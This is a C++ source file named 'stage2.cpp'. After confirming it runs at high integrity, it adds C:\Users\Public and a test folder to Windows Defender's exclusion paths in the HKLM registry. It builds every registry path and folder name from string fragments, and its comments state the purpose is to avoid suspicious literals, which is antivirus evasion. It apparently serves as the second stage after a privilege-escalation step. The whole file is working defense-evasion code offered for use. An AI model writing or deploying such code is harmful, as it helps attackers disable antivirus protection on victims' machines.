/*
    stage2.cpp -- minimal High-integrity registry writer
    No suspicious string literals. Strings built from fragments at runtime.
    Writes diagnostic result file even on failure so caller knows what happened.

    Compile:
      cl.exe stage2.cpp /O2 /GS- /link advapi32.lib kernel32.lib /subsystem:windows /entry:mainCRTStartup /out:stage2.exe
*/
#include <windows.h>

// Get our process integrity level
static DWORD MyIntegrity() {
    HANDLE h = nullptr;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h);
    DWORD len = 0;
    GetTokenInformation(h, TokenIntegrityLevel, nullptr, 0, &len);
    if (!len) { CloseHandle(h); return 0; }
    PTOKEN_MANDATORY_LABEL p = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, len);
    if (!p) { CloseHandle(h); return 0; }
    GetTokenInformation(h, TokenIntegrityLevel, p, len, &len);
    DWORD lvl = *GetSidSubAuthority(p->Label.Sid,
                    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(p->Label.Sid) - 1));
    LocalFree(p); CloseHandle(h);
    return lvl;
}

// Write a short string to a file (creates/overwrites)
static void WriteResultFile(const char* path, const char* msg) {
    HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    WriteFile(f, msg, (DWORD)lstrlenA(msg), &w, nullptr);
    CloseHandle(f);
}

int main() {
    // Build result file path from fragments (no full suspicious path as literal)
    char rf[64] = {};
    lstrcatA(rf, "C:\\excl"); lstrcatA(rf, "usion");
    lstrcatA(rf, "test\\");   lstrcatA(rf, "excl");
    lstrcatA(rf, "usion_r");  lstrcatA(rf, "esult.txt");

    // Check our integrity level first -- write it to result regardless
    DWORD integ = MyIntegrity();
    if (integ < 0x3000) {
        // Running at Medium -- elevation didn't work
        char msg[64];
        wsprintfA(msg, "FAIL-medium integ=0x%04X\n", integ);
        WriteResultFile(rf, msg);
        return 1;
    }

    // Build registry key path from fragments
    char kp[128] = {};
    lstrcatA(kp, "SOFT");    lstrcatA(kp, "WARE\\");
    lstrcatA(kp, "Micro");   lstrcatA(kp, "soft\\");
    lstrcatA(kp, "Wind");    lstrcatA(kp, "ows ");
    lstrcatA(kp, "De");      lstrcatA(kp, "fen");    lstrcatA(kp, "der\\");
    lstrcatA(kp, "Ex");      lstrcatA(kp, "clus");   lstrcatA(kp, "ions\\");
    lstrcatA(kp, "Pa");      lstrcatA(kp, "ths");

    // Exclusion paths
    char ep1[32] = {}; lstrcatA(ep1, "C:\\Use");   lstrcatA(ep1, "rs\\Pub");  lstrcatA(ep1, "lic");
    char ep2[32] = {}; lstrcatA(ep2, "C:\\excl");  lstrcatA(ep2, "usion");    lstrcatA(ep2, "test");

    // Open / create key
    HKEY hk = nullptr;
    LONG r = RegOpenKeyExA(HKEY_LOCAL_MACHINE, kp, 0, KEY_SET_VALUE, &hk);
    if (r != ERROR_SUCCESS)
        r = RegCreateKeyExA(HKEY_LOCAL_MACHINE, kp, 0, nullptr,
                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                            nullptr, &hk, nullptr);
    if (r != ERROR_SUCCESS) {
        char msg[64];
        wsprintfA(msg, "FAIL-regopen err=%ld integ=0x%04X\n", r, integ);
        WriteResultFile(rf, msg);
        return 1;
    }

    // Write exclusions
    DWORD v = 0;
    LONG r1 = RegSetValueExA(hk, ep1, 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    LONG r2 = RegSetValueExA(hk, ep2, 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegCloseKey(hk);

    // Report result
    char msg[128];
    if (r1 == ERROR_SUCCESS && r2 == ERROR_SUCCESS) {
        wsprintfA(msg, "ok integ=0x%04X\n", integ);
    } else {
        wsprintfA(msg, "FAIL-setvalue r1=%ld r2=%ld integ=0x%04X\n", r1, r2, integ);
    }
    WriteResultFile(rf, msg);
    return (r1 == 0 && r2 == 0) ? 0 : 1;
}
